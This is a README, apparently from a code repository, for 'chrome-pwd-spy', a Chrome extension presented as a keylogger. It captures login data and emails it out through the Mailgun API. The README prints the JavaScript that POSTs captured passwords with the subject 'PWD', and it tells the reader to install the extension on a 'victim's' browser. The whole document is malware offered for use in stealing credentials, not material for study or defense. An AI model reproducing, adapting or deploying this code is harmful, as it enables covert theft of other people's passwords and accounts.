### #сhrome-pwd-spy

Simplest keylogger, directly records login data to transactional email (mailgun right now).

##### how to use ->

*js/background.js:*

```javascript
 var body =   {
	from: 'mailgun@sandboxab04a0cb2f204bb3a60fc5c0500ea941.mailgun.org', //<--- from
        to : '', //<--- to
	subject: 'PWD',
	text: data
 };

 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://api.mailgun.net/v3/<YOUR DOMAIN THERE>/messages", true); //<--- Your mailgun domain there
 xhr.setRequestHeader ("Authorization", "<YOUR API-KEY THERE>"); //<--- Your key there
 xhr.setRequestHeader("Content-Type","application/json");
 xhr.send(JSON.stringify(body));
```

Set your credentials, then install extension on your victim's chrome browser and that's it!
